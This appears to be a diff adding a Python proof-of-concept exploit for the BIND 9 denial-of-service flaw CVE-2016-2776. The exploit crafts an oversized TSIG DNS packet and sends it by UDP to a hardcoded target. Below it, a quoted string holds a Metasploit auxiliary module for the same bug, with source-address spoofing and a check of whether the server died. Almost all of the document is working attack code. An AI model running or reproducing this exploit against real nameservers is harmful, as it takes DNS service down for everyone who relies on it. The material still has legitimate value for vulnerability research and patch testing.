@@ -1,0 +1,201 @@
+import socket
+import struct
+
+TARGET = ('192.168.200.10', 53)
+
+Q_A = 1
+Q_TSIG = 250
+DNS_MESSAGE_HEADERLEN = 12
+
+
+def build_bind_nuke(question="\x06google\x03com\x00", udpsize=512):
+    query_A = "\x8f\x65\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01" + question + int16(Q_A) + "\x00\x01"
+
+    sweet_spot = udpsize - DNS_MESSAGE_HEADERLEN + 1
+    tsig_rr = build_tsig_rr(sweet_spot)
+
+    return query_A + tsig_rr
+
+def int16(n):
+    return struct.pack("!H", n)
+
+def build_tsig_rr(bind_demarshalled_size):
+    signature_data = ("\x00\x00\x57\xeb\x80\x14\x01\x2c\x00\x10\xd2\x2b\x32\x13\xb0\x09"
+                      "\x46\x34\x21\x39\x58\x62\xf3\xd5\x9c\x8b\x8f\x65\x00\x00\x00\x00")
+    tsig_rr_extra_fields = "\x00\xff\x00\x00\x00\x00"
+
+    necessary_bytes  = len(signature_data) + len(tsig_rr_extra_fields)
+    necessary_bytes += 2 + 2 # length fields
+
+    # from sizeof(TSIG RR) bytes conforming the TSIG RR
+    # bind9 uses sizeof(TSIG RR) - 16 to build its own
+    sign_name, algo_name = generate_padding(bind_demarshalled_size - necessary_bytes + 16)
+
+    tsig_hdr = sign_name + int16(Q_TSIG) + tsig_rr_extra_fields
+    tsig_data = algo_name + signature_data
+    return tsig_hdr + int16(len(tsig_data)) + tsig_data
+
+def generate_padding(n):
+    max_per_bucket = [0x3f, 0x3f, 0x3f, 0x3d, 0x3f, 0x3f, 0x3f, 0x3d]
+    buckets = [1] * len(max_per_bucket)
+
+    min_size = len(buckets) * 2 + 2 # 2 bytes for every bucket plus each null byte
+    max_size = sum(max_per_bucket) + len(buckets) + 2
+
+    if not(min_size <= n <= max_size):
+        raise RuntimeException("unsupported amount of bytes")
+
+    curr_idx, n = 0, n - min_size
+    while n > 0:
+        next_n = max(n - (max_per_bucket[curr_idx] - 1), 0)
+        buckets[curr_idx] = 1 + n - next_n
+        n, curr_idx = next_n, curr_idx + 1
+
+    n_padding = lambda amount: chr(amount) + "A" * amount
+    stringify = lambda sizes: "".join(map(n_padding, sizes)) + "\x00"
+
+    return stringify(buckets[:4]), stringify(buckets[4:])
+
+if __name__ == "__main__":
+    bombita = build_bind_nuke()
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(bombita, TARGET)
+    s.close()
+
+'''
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'timeout'
+require 'socket'
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Capture
+  include Msf::Auxiliary::UDPScanner
+  include Msf::Auxiliary::Dos
+  include Msf::Auxiliary::Report
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'        => 'BIND 9 DoS CVE-2016-2776',
+      'Description' => %q{
+          Denial of Service Bind 9 DNS Server CVE-2016-2776.
+          Critical error condition which can occur when a nameserver is constructing a response.
+          A defect in the rendering of messages into packets can cause named to exit with an
+          assertion failure in buffer.c while constructing a response to a query that meets certain criteria.
+
+          This assertion can be triggered even if the apparent source address isnt allowed
+          to make queries.
+      },
+      # Research and Original PoC - msf module author
+      'Author'      => [ 'Martin Rocha', 'Ezequiel Tavella', 'Alejandro Parodi', 'Infobyte Research Team'],
+      'License'     => MSF_LICENSE,
+      'References'      =>
+        [
+          [ 'CVE', '2016-2776' ],
+          [ 'URL', 'http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html' ]
+        ],
+      'DisclosureDate' => 'Sep 27 2016',
+      'DefaultOptions' => {'ScannerRecvWindow' => 0}
+    ))
+
+    register_options([
+      Opt::RPORT(53),
+      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
+    ])
+
+    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
+  end
+
+  def check_server_status(ip, rport)
+    res = ""
+    sudp = UDPSocket.new
+    sudp.send(valid_query, 0, ip, rport)
+    begin
+      Timeout.timeout(5) do
+      res = sudp.recv(100)
+    end
+    rescue Timeout::Error
+    end
+
+    if(res.length==0)
+      print_good("Exploit Success (Maybe, nameserver did not replied)")
+      else
+        print_error("Exploit Failed")
+    end
+  end
+
+  def scan_host(ip)
+    @flag_success = true
+    print_status("Sending bombita (Specially crafted udp packet) to: "+ip)
+    scanner_send(payload, ip, rport)
+    check_server_status(ip, rport)
+  end
+
+  def get_domain
+    domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
+    org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
+    get_domain = domain+org
+  end
+
+  def payload
+    query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
+    query += "\x00\x00"  # Flags: 0x0000 Standard query
+    query += "\x00\x01"  # Questions: 1
+    query += "\x00\x00"  # Answer RRs: 0
+    query += "\x00\x00"  # Authority RRs: 0
+    query += "\x00\x01"  # Additional RRs: 1
+
+    # Doman Name
+    query += get_domain   # Random DNS Name
+    query += "\x00"      # [End of name]
+    query += "\x00\x01"  # Type: A (Host Address) (1)
+    query += "\x00\x01"  # Class: IN (0x0001)
+
+    # Aditional records. Name
+    query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes
+    query += "\x3d"+Rex::Text.rand_text_alphanumeric(61)
+    query += "\x00"
+
+    query += "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
+    query += "\x00\xff" # Class: ANY (0x00ff)
+    query += "\x00\x00\x00\x00" # Time to live: 0
+    query += "\x00\xfc" # Data length: 252
+
+    # Algorithm Name
+    query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #Random 192 bytes
+    query += "\x1A"+Rex::Text.rand_text_alphanumeric(26) #Random 26 bytes
+    query += "\x00"
+
+    # Rest of TSIG
+    query += "\x00\x00"+Rex::Text.rand_text_alphanumeric(4) # Time Signed: Jan  1, 1970 03:15:07.000000000 ART
+    query += "\x01\x2c" # Fudge: 300
+    query += "\x00\x10" # MAC Size: 16
+    query +=  Rex::Text.rand_text_alphanumeric(16) # MAC
+    query += "\x8f\x65" # Original Id: 36709
+    query += "\x00\x00" # Error: No error (0)
+    query += "\x00\x00" # Other len: 0
+  end
+
+  def valid_query
+    query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
+    query += "\x00\x00"  # Flags: 0x0000 Standard query
+    query += "\x00\x01"  # Questions: 1
+    query += "\x00\x00"  # Answer RRs: 0
+    query += "\x00\x00"  # Authority RRs: 0
+    query += "\x00\x00"  # Additional RRs: 0
+
+    # Doman Name
+    query += get_domain   # Random DNS Name
+    query += "\x00"      # [End of name]
+    query += "\x00\x01"  # Type: A (Host Address) (1)
+    query += "\x00\x01"  # Class: IN (0x0001)s
+  end
+
+end
+'''
